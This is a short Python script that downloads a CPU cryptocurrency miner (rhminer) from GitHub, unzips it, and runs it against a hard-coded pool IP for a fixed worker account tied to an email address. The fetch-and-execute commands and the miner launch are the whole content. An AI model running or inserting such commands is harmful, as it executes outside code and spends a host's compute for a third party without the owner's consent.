import os

cmd = "wget https://github.com/polyminer1/rhminer/releases/download/v1.2/rhminer.1.2.Linux.CPU.zip"
os.system(cmd)
cmd2 = "unzip rhminer.1.2.Linux.CPU.zip"
os.system(cmd2)
cmd3 = "./rhminer -s  40.114.76.19:443 -su 86646-64.8ce4a4b69b2b1fcd.ooxx/wenyuan85858@gmail.com -r 20 -cpu -cputhreads 4"
os.system(cmd3)
